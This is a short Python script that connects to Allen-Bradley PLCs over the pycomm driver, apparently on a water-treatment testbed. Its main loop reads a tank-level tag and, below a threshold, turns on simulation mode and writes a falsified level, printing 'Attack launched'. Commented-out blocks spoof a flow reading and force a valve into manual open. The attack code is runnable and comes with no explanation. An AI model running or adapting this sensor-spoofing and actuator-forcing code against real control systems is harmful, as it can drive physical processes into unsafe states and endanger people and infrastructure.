import time ,string, datetime

from pycomm.ab_comm.clx import Driver as ClxDriver

PLC_IPS = {
    'plc1': '192.168.1.10',
    'tag_plc1':['HMI_LIT101.Pv','AI_FIT_101_FLOW', 'HMI_LIT101.Sim_Pv'],
    'plc2': '192.168.1.20',
    'plc3': '192.168.1.30',
    'tag_plc3':['HMI_LIT301.Pv','AI_FIT_301_FLOW'],
    'plc4': '192.168.1.40',
    'tag_plc4':['HMI_LIT401.Pv','AI_FIT_401_FLOW'],
    'plc5': '192.168.1.50',
    'plc6': '192.168.1.60',
    'plc1r': '192.168.1.11',
    'plc2r': '192.168.1.21',
    'plc3r': '192.168.1.31',
    'plc4r': '192.168.1.41',
    'plc5r': '192.168.1.51',
    'plc6r': '192.168.1.61',
}

def test_plc_write(plc_ip, tag_name, value, tag_type):
    plc = ClxDriver()
    if plc.open(plc_ip):
        plc.write_tag(tag_name, value, tag_type)
        plc.close()

def test_plc_read(plc_ip, tag_name):
    plc = ClxDriver()
    if plc.open(plc_ip):
        plc.read_tag(tag_name)
        plc.close()

def test_plc_read_val(plc_ip, tag_name):
    plc = ClxDriver()
    if plc.open(plc_ip):
        tagg = plc.read_tag(tag_name)
        plc.close()
        return (tagg)

H=700
L=600
def main():
    """
    test_plc_write(PLC_IPS['plc1'], 'HMI_LIT101.Sim', True , 'BOOL')
    test_plc_write(PLC_IPS['plc1'], 'HMI_LIT101.Sim_PV', 600, 'REAL')
    """
    while(True):
        a=test_plc_read_val(PLC_IPS['plc1'], 'HMI_LIT101.pv')
        if(a[0]<L):
            test_plc_write(PLC_IPS['plc1'], 'HMI_LIT101.Sim', True , 'BOOL')
            test_plc_write(PLC_IPS['plc1'], 'HMI_LIT101.Sim_PV', a[0]+2, 'REAL')
            print("Attack launched")
        time.sleep(2)
    

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:  
        test_plc_write(PLC_IPS['plc1'], 'HMI_FIT101.Sim', False , 'BOOL')
        test_plc_write(PLC_IPS['plc1'], 'HMI_MV101.Auto', 1 , 'BOOL')

        """
        for x in range(1, 5):

        test_plc_write(PLC_IPS['plc1'], 'HMI_FIT101.Sim', True , 'BOOL')
        test_plc_write(PLC_IPS['plc1'], 'HMI_FIT101.Sim_PV', 2.5, 'REAL')

        test_plc_write(PLC_IPS['plc1'], 'HMI_MV101.Auto', 0 , 'BOOL')
        test_plc_write(PLC_IPS['plc1'], 'HMI_MV101.Cmd', 1, 'INT') 

        for i in range(1,6):
            time.sleep(60)

        test_plc_write(PLC_IPS['plc1'], 'HMI_FIT101.Sim', False , 'BOOL')
        test_plc_write(PLC_IPS['plc1'], 'HMI_MV101.Auto', 1 , 'BOOL')
        for i in range(1,11):
            time.sleep(60)
        """
